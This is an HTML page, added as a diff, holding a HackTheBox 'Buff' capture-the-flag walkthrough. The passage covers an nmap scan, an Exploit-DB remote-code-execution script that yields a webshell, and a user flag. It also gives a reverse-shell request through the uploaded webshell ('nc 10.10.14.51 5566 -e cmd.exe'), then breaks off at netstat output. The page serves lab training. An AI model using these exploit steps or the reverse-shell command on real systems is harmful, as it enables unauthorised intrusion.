@@ -1,0 +1,1147 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.26.2 by Michael Rose
+  Copyright 2013-2024 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+
+<html lang="en-US" class="no-js">
+  <head>
+    <meta charset="utf-8">
+<!-- begin _includes/seo.html --><title>HackTheBox Buff - Dcodezero</title>
+<meta name="description" content="Buff is a Hackthebox active machine, so you need the Admin hash to decrypt the walkthrough!">
+
+
+  <meta name="author" content="DcodeZer0">
+  
+  <meta property="article:author" content="DcodeZer0">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Dcodezero">
+<meta property="og:title" content="HackTheBox Buff">
+<meta property="og:url" content="http://localhost:4000/hackthebox/Buff/">
+
+
+  <meta property="og:description" content="Buff is a Hackthebox active machine, so you need the Admin hash to decrypt the walkthrough!">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/img/sample/buff/buff.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2020-07-23T00:00:00+05:30">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/hackthebox/Buff/">
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Dcodezero Feed">
+
+
+<!-- Add Mermaid with Debug -->
+<script src="https://cdn.jsdelivr.net/npm/mermaid@8.14.0/dist/mermaid.min.js"></script>
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    mermaid.initialize({
+        startOnLoad: true,
+        securityLevel: 'loose',
+        logLevel: 'debug',
+        mindmap: {
+            padding: 20,
+            nodeSpacing: 60,
+            rankSpacing: 80
+        }
+    });
+
+    // Add error handling
+    mermaid.parseError = function(err, hash) {
+        console.error('Mermaid error:', err);
+        // Add visible error message
+        document.querySelectorAll('.mermaid').forEach(function(elem) {
+            elem.innerHTML += '<div style="color: red; background: #ffebee; padding: 10px; margin-top: 10px; border: 1px solid #ffcdd2;">Diagram Error: ' + err + '</div>';
+        });
+    };
+});
+</script><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<script>
+document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+ window.enable_copy_code_button = true;
+</script>
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css"></noscript>
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single" dir="ltr">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/brew.webp" alt="Dcodezero"></a>
+        
+        <a class="site-title" href="/">
+          Dcodezero
+          <span class="site-subtitle">Hack>>Sleep>>Repeat</span>
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a
+                href="/about/"
+                
+                
+              >About</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/categories/"
+                
+                
+              >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/tags"
+                
+                
+              >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/it-posts/"
+                
+                
+              >I.T</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/tools/"
+                
+                
+              >Tools</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/helpedyou/"
+                
+                
+              >Think I Helped You?</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <i class="fas fa-search"></i>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+  
+
+
+
+
+
+
+
+<div class="page__hero--overlay"
+  style="background-color: #000; background-image: linear-gradient(rgba(0, 0, 0, 0.75), rgba(0, 0, 0, 0.75)), url('/assets/img/sample/buff/buff.png');"
+>
+  
+    <div class="wrapper">
+      <h1 id="page-title" class="page__title" itemprop="headline">
+        
+          HackTheBox Buff
+
+        
+      </h1>
+      
+        <p class="page__lead">Buff is a Hackthebox active machine, so you need the Admin hash to decrypt the walkthrough!
+</p>
+      
+      
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2020-07-23T00:00:00+05:30">July 23, 2020</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          7 minute read
+        
+      </span>
+    
+  </p>
+
+
+      
+    </div>
+  
+  
+</div>
+
+
+
+
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/" itemprop="item"><span itemprop="name">Home</span></a>
+
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/categories/#hackthebox" itemprop="item"><span itemprop="name">Hackthebox</span></a>
+          <meta itemprop="position" content="2" />
+        </li>
+        <span class="sep">/</span>
+      
+    
+      
+      
+        <li class="current">HackTheBox Buff</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="/">
+        <img src="/assets/images/brew.webp" alt="DcodeZer0" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="/" itemprop="url">DcodeZer0</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        <p>┌──[root@dcodezero]
+└──╼ # Hacker | RedTeam | PenTester | CTFPlayer | HackTheBox</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name" class="p-locality">Somewhere</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://twitter.com/Dcodezer0" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/DcodeZero" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://app.hackthebox.com/profile/291968" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fa-solid fa-cube" aria-hidden="true"></i><span class="label">Hackthebox</span></a></li>
+          
+        
+      
+
+      
+
+      
+        <li>
+          <a href="mailto:dcodezero@proton.me" rel="me" class="u-email">
+            <meta itemprop="email" content="dcodezero@proton.me" />
+            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="HackTheBox Buff">
+    <meta itemprop="description" content="Buff is a Hackthebox active machine, so you need the Admin hash to decrypt the walkthrough!">
+    <meta itemprop="datePublished" content="2020-07-23T00:00:00+05:30">
+    
+
+    <div class="page__inner-wrap">
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu"><li><a href="#info">Info</a></li><li><a href="#lets-get-started">Let’s get started</a><ul><li><a href="#as-always-hacking-starts-with-nmap-scan">As always hacking starts with NMAP scan.</a></li></ul></li><li><a href="#finding-the-cve-from-exploit-db">Finding the CVE from Exploit-db</a></li><li><a href="#using-the-exploit">Using the Exploit</a></li><li><a href="#exploiting">Exploiting…..</a></li><li><a href="#getting-usertxt">Getting User.txt</a><ul><li><a href="#now-time-to-find-the-vulnerable-service">Now time to find the Vulnerable Service..</a></li><li><a href="#comparing-the-procress-with-all-the-procress-details">Comparing the procress with all the procress details..</a></li></ul></li><li><a href="#privilege-escalation">Privilege Escalation</a><ul><li><a href="#so-here-is-the-game-plan">So here is the game plan</a></li></ul></li><li><a href="#step-1">Step 1</a><ul><li><a href="#enable-sshd-service-on-your-kali-machine">Enable sshd service on your kali machine:</a></li></ul></li><li><a href="#step-2">Step 2</a><ul><li><a href="#use-plink-to-portforward-on-your-local-listener">Use Plink to portforward on your local listener</a></li></ul></li><li><a href="#cloudme-1112--cve--administrator">CloudMe 1.11.2 -CVE – Administrator:</a><ul><li><a href="#the-shellcode-should-be-changed-in-order-to-get-the-reverse-shell">The shellcode should be changed in order to get the reverse shell.</a></li></ul></li><li><a href="#note">Note:</a><ul><li><a href="#you-should-see-this-if-the-exploit-runs-correctly">you should see this if the exploit runs correctly.</a></li></ul></li><li><a href="#getting-roottxt">Getting Root.txt</a></li></ul>
+            </nav>
+          </aside>
+        
+        <h2 id="info">Info</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>Buff</th>
+      <th> </th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>OS:</td>
+      <td>Windows</td>
+    </tr>
+    <tr>
+      <td>Difficulty:</td>
+      <td>Easy</td>
+    </tr>
+    <tr>
+      <td>Points:</td>
+      <td>20</td>
+    </tr>
+    <tr>
+      <td>Release:</td>
+      <td>18 Jul 2020</td>
+    </tr>
+    <tr>
+      <td>IP:</td>
+      <td>10.10.10.198</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="lets-get-started">Let’s get started</h2>
+
+<h3 id="as-always-hacking-starts-with-nmap-scan">As always hacking starts with NMAP scan.</h3>
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nmap</span> <span class="o">-</span><span class="n">sV</span> <span class="o">-</span><span class="no">Pn</span> <span class="o">-</span><span class="n">sC</span> <span class="o">-</span><span class="no">A</span> <span class="o">-</span><span class="no">T4</span> <span class="n">buff</span><span class="p">.</span><span class="nf">htb</span> 
+<span class="no">Starting</span> <span class="no">Nmap</span> <span class="mf">7.80</span> <span class="p">(</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">nmap</span><span class="p">.</span><span class="nf">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2020</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mi">23</span> <span class="mo">05</span><span class="p">:</span><span class="mi">58</span> <span class="no">EDT</span>
+<span class="no">Nmap</span> <span class="nb">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">buff</span><span class="p">.</span><span class="nf">htb</span> <span class="p">(</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.198</span><span class="p">)</span>
+<span class="no">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.19</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+<span class="no">Not</span> <span class="ss">shown: </span><span class="mi">999</span> <span class="n">filtered</span> <span class="n">ports</span>
+<span class="no">PORT</span>     <span class="no">STATE</span> <span class="no">SERVICE</span> <span class="no">VERSION</span>
+<span class="mi">8080</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="no">Apache</span> <span class="n">httpd</span> <span class="mf">2.4</span><span class="o">.</span><span class="mi">43</span> <span class="p">((</span><span class="no">Win64</span><span class="p">)</span> <span class="no">OpenSSL</span><span class="o">/</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">1</span><span class="n">g</span> <span class="no">PHP</span><span class="o">/</span><span class="mf">7.4</span><span class="o">.</span><span class="mi">6</span><span class="p">)</span>
+<span class="o">|</span> <span class="n">http</span><span class="o">-</span><span class="nb">open</span><span class="o">-</span><span class="ss">proxy: </span><span class="no">Potentially</span> <span class="no">OPEN</span> <span class="n">proxy</span><span class="o">.</span>
+<span class="o">|</span><span class="n">_Methods</span> <span class="n">supported</span><span class="ss">:CONNECTION</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="ss">header: </span><span class="no">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">43</span> <span class="p">(</span><span class="no">Win64</span><span class="p">)</span> <span class="no">OpenSSL</span><span class="o">/</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">1</span><span class="n">g</span> <span class="no">PHP</span><span class="o">/</span><span class="mf">7.4</span><span class="o">.</span><span class="mi">6</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="ss">title: </span><span class="n">mrb3n</span><span class="err">'</span><span class="n">s</span> <span class="no">Bro</span> <span class="no">Hut</span>
+<span class="no">Warning</span><span class="p">:</span> <span class="no">OSScan</span> <span class="n">results</span> <span class="n">may</span> <span class="n">be</span> <span class="n">unreliable</span> <span class="n">because</span> <span class="n">we</span> <span class="n">could</span> <span class="n">not</span> <span class="n">find</span> <span class="n">at</span> <span class="n">least</span> <span class="mi">1</span> <span class="nb">open</span> <span class="n">and</span> <span class="mi">1</span> <span class="n">closed</span> <span class="n">port</span>
+<span class="no">Device</span> <span class="ss">type: </span><span class="n">general</span> <span class="n">purpose</span>
+<span class="no">Running</span> <span class="p">(</span><span class="no">JUST</span> <span class="no">GUESSING</span><span class="p">):</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">XP</span><span class="o">|</span><span class="mi">7</span> <span class="p">(</span><span class="mi">86</span><span class="o">%</span><span class="p">)</span>
+<span class="no">OS</span> <span class="no">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">:microsoft:windows_xp</span><span class="o">::</span><span class="n">sp2</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">:microsoft:windows_7</span>
+<span class="no">Aggressive</span> <span class="no">OS</span> <span class="ss">guesses: </span><span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">XP</span> <span class="no">SP2</span> <span class="p">(</span><span class="mi">86</span><span class="o">%</span><span class="p">),</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="mi">7</span> <span class="p">(</span><span class="mi">85</span><span class="o">%</span><span class="p">)</span>
+<span class="no">No</span> <span class="n">exact</span> <span class="no">OS</span> <span class="n">matches</span> <span class="k">for</span> <span class="n">host</span> <span class="p">(</span><span class="nb">test</span> <span class="n">conditions</span> <span class="n">non</span><span class="o">-</span><span class="n">ideal</span><span class="p">)</span><span class="o">.</span>
+<span class="no">Network</span> <span class="no">Distance</span><span class="p">:</span> <span class="mi">2</span> <span class="n">hops</span>
+
+<span class="no">TRACEROUTE</span> <span class="p">(</span><span class="n">using</span> <span class="n">port</span> <span class="mi">8080</span><span class="o">/</span><span class="n">tcp</span><span class="p">)</span>
+<span class="no">HOP</span> <span class="no">RTT</span>       <span class="no">ADDRESS</span>
+<span class="mi">1</span>   <span class="mf">195.99</span> <span class="n">ms</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">14.1</span>
+<span class="mi">2</span>   <span class="mf">196.06</span> <span class="n">ms</span> <span class="n">buff</span><span class="p">.</span><span class="nf">htb</span> <span class="p">(</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.198</span><span class="p">)</span>
+
+<span class="no">OS</span> <span class="n">and</span> <span class="no">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="o">.</span> <span class="no">Please</span> <span class="n">report</span> <span class="n">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">nmap</span><span class="p">.</span><span class="nf">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="o">.</span>
+<span class="no">Nmap</span> <span class="ss">done: </span><span class="mi">1</span> <span class="no">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="k">in</span> <span class="mf">57.75</span> <span class="n">seconds</span>
+</code></pre></div></div>
+<p><img src="/assets/img/sample/buff/buff1.png" alt="" /></p>
+
+<h2 id="finding-the-cve-from-exploit-db">Finding the CVE from Exploit-db</h2>
+
+<p><code class="language-plaintext highlighter-rouge">https://www.exploit-db.com/exploits/48506</code></p>
+
+<h2 id="using-the-exploit">Using the Exploit</h2>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="mi">48506</span><span class="p">.</span><span class="nf">py</span> 
+            <span class="sr">/\
+/</span><span class="n">vvvvvvvvvvvv</span> <span class="p">\</span><span class="o">--------------------------------------</span><span class="p">,</span>
+<span class="sb">`^^^^^^^^^^^^ /============BOKU====================="
+            </span><span class="se">\/</span><span class="sb">                                                                                                                                                                                                                             
+                                                                                                                                                                                                                                           
+(+) Usage:       python 48506.py &lt;WEBAPP_URL&gt;                                                                                                                                                                                              
+(+) Example:     python 48506.py 'https://10.0.0.3:443/gym/'  
+</span></code></pre></div></div>
+<h2 id="exploiting">Exploiting…..</h2>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="mi">48506</span><span class="p">.</span><span class="nf">py</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">buff</span><span class="p">.</span><span class="nf">htb</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span>                                                                                                                                                                                
+            <span class="sr">/\                                                                                                                                                                                                                             
+/</span><span class="n">vvvvvvvvvvvv</span> <span class="p">\</span><span class="o">--------------------------------------</span><span class="p">,</span>                                                                                                                                                                                     
+<span class="sb">`^^^^^^^^^^^^ /============BOKU====================="                                                                                                                                                                                      
+            </span><span class="se">\/</span><span class="sb">                                                                                                                                                                                                                             
+                                                                                                                                                                                                                                           
+[+] Successfully connected to webshell.                                                                                                                                                                                                    
+C:</span><span class="se">\xa</span><span class="sb">mpp</span><span class="se">\h</span><span class="sb">tdocs</span><span class="se">\g</span><span class="sb">ym</span><span class="se">\u</span><span class="sb">pload&gt;              
+</span></code></pre></div></div>
+<h2 id="getting-usertxt">Getting User.txt</h2>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">C</span><span class="p">:\</span><span class="n">xampp</span><span class="p">\</span><span class="n">htdocs</span><span class="p">\</span><span class="n">gym</span><span class="p">\</span><span class="n">upload</span><span class="o">&gt;</span> <span class="n">whoami</span> <span class="sr">/all                                                                                                                                                                                                    
+�PNG                                                                                                                                                                                                                                       
+▒                                                                                                                                                                                                                                          
+                                                                                                                                                                                                                                           
+USER INFORMATION
+----------------
+
+User Name  SID                                           
+========== ==============================================
+buff\shaun S-1-5-21-2277156429-3381729605-2640630771-1001
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                             Type             SID          Attributes                                        
+====================================== ================ ============ ==================================================
+Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\BATCH                     Well-known group S-1-5-3      Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                    
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                          State   
+============================= ==================================== ========
+SeShutdownPrivilege           Shut down the system                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
+SeUndockPrivilege             Remove computer from docking station Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
+SeTimeZonePrivilege           Change the time zone                 Disabled
+
+</span></code></pre></div></div>
+
+<p>From here I came to see what is the username..</p>
+
+<p><code class="language-plaintext highlighter-rouge">buff\shaun S-1-5-21-2277156429-3381729605-2640630771-1001</code></p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="no">C</span><span class="p">:\</span><span class="n">xampp</span><span class="p">\</span><span class="n">htdocs</span><span class="p">\</span><span class="n">gym</span><span class="p">\</span><span class="n">upload</span><span class="o">&gt;</span> <span class="n">type</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="n">shaun</span><span class="p">\</span><span class="no">Desktop</span><span class="p">\</span><span class="n">user</span><span class="p">.</span><span class="nf">txt</span>
+<span class="err">�</span><span class="no">PNG</span>
+<span class="err">▒</span>
+<span class="mi">5345</span><span class="n">fe517be93e1b736b12b0267654c2</span>
+
+</code></pre></div></div>
+
+<p>Now let’s visit the <code class="language-plaintext highlighter-rouge">http://buff.htb:8080/upload.php</code> too see anything intresting?</p>
+
+<p><img src="/assets/img/sample/buff/buff2.png" alt="" /></p>
+
+<p>From the image we can see that the shell I got is not that great.. So I moved to gain the shell from the uploaded payload from the URL.</p>
+
+<p><img src="/assets/img/sample/buff/buff3.png" alt="" /></p>
+
+<p><code class="language-plaintext highlighter-rouge"> http://buff.htb:8080/upload/kamehameha.php?telepathy=nc 10.10.14.51 5566 -e cmd.exe</code></p>
+
+<p><img src="/assets/img/sample/buff/buff4.png" alt="" />
+<img src="/assets/img/sample/buff/buff5.png" alt="" /></p>
+
+<h3 id="now-time-to-find-the-vulnerable-service">Now time to find the Vulnerable Service..</h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C</span><span class="p">:</span>\<span class="n">xampp</span>\<span class="n">htdocs</span>\<span class="n">gym</span>\<span class="n">upload</span><span class="o">&gt;</span><span class="n">netstat</span> <span class="o">-</span><span class="n">an</span>
+<span class="n">netstat</span> <span class="o">-</span><span class="n">an</span>
+
+<span class="n">Active</span> <span class="n">Connections</span>
+
+  <span class="n">Proto</span>  <span class="n">Local</span> <span class="n">Address</span>          <span class="n">Foreign</span> <span class="n">Address</span>        <span class="n">State</span>
+  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">135</span>            <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">445</span>            <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">4444</span>           <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">4545</span>           <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">5040</span>           <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">7680</span>           <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">8080</span>           <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">9999</span>           <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">49664</span>          <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">49665</span>          <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">49666</span>          <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">49667</span>          <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">49668</span>          <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">49669</span>          <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">139</span>       <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">8080</span>      <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.33</span><span class="p">:</span><span class="mi">37962</span>      <span class="n">ESTABLISHED</span>
+  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">8080</span>      <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.41</span><span class="p">:</span><span class="mi">34394</span>      <span class="n">FIN_WAIT_2</span>
+  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">8080</span>      <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.51</span><span class="p">:</span><span class="mi">58486</span>      <span class="n">CLOSE_WAIT</span>
+  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">8080</span>      <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.51</span><span class="p">:</span><span class="mi">58488</span>      <span class="n">TIME_WAIT</span>
